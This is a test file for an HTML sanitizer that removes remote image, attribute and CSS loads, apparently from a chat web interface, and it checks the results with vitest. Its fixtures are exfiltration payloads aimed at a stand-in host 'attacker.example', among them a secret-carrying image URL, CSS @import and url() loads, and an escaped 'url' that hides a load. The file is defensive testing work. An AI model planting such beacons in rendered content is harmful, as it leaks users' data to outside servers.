// @vitest-environment jsdom
import { describe, expect, it, vi } from 'vitest';

vi.mock('$lib/constants', () => ({ WEBUI_BASE_URL: '' }));

import { withoutRemoteLoads } from './remoteLoads';

const parse = (html: string) => {
	const template = document.createElement('template');
	template.innerHTML = withoutRemoteLoads(html);
	return template.content;
};

describe('withoutRemoteLoads', () => {
	it('turns a remote picture into its alt text and keeps local ones', () => {
		const out = parse(
			'<table><tr><td><img src="https://attacker.example/p.png?d=secret" alt="chart"><img src="/api/v1/files/a/content" alt="own"><img src="data:image/png;base64,AA"></td></tr></table>'
		);
		expect(out.textContent).toContain('chart');
		expect([...out.querySelectorAll('img')].map((img) => img.getAttribute('alt'))).toEqual([
			'own',
			null
		]);
	});

	it('drops remote URLs from attributes but keeps links', () => {
		const out = parse(
			'<table background="https://attacker.example/b.png"><tr><td><a href="https://example.org/" ping="https://attacker.example/p">link</a><video poster="//attacker.example/v.png"></video><img srcset="https://attacker.example/s.png 2x" src="/own.png"></td></tr></table>'
		);
		expect(out.querySelector('table')?.hasAttribute('background')).toBe(false);
		expect(out.querySelector('a')?.getAttribute('href')).toBe('https://example.org/');
		expect(out.querySelector('a')?.hasAttribute('ping')).toBe(false);
		expect(out.querySelector('video')?.hasAttribute('poster')).toBe(false);
		expect(out.querySelector('img')?.hasAttribute('srcset')).toBe(false);
		expect(out.querySelector('img')?.getAttribute('src')).toBe('/own.png');
	});

	it('removes remote CSS loads from style attributes and style elements', () => {
		const out = parse(
			'<svg><style>@import "https://attacker.example/a.css"; .n { fill: red; background: url(https://attacker.example/b?d=1); } .m { background: url(#grad) }</style><image href="https://attacker.example/i.png"></image><use href="https://attacker.example/s.svg#x"></use><rect style="fill: blue; background-image: image-set(&quot;https://attacker.example/c.png&quot; 1x)"></rect></svg>'
		);
		const css = out.querySelector('style')?.textContent ?? '';
		expect(css).not.toContain('attacker');
		expect(css).toContain('fill: red');
		expect(css).toContain('url(#grad)');
		expect(out.querySelector('image')).toBeNull();
		expect(out.querySelector('use')?.hasAttribute('href')).toBe(false);
		expect(out.querySelector('rect')?.getAttribute('style')).toContain('fill: blue');
		expect(out.querySelector('rect')?.getAttribute('style')).not.toContain('attacker');
	});

	it('drops escaped CSS that hides a remote load, and keeps escaped CSS that does not', () => {
		const hidden = parse('<p style="background: \\75 rl(https://attacker.example/x)">x</p>');
		expect(hidden.querySelector('p')?.hasAttribute('style')).toBe(false);
		const harmless = parse('<style>.a::before { content: "\\2014" }</style>');
		expect(harmless.querySelector('style')?.textContent).toContain('\\2014');
	});
});
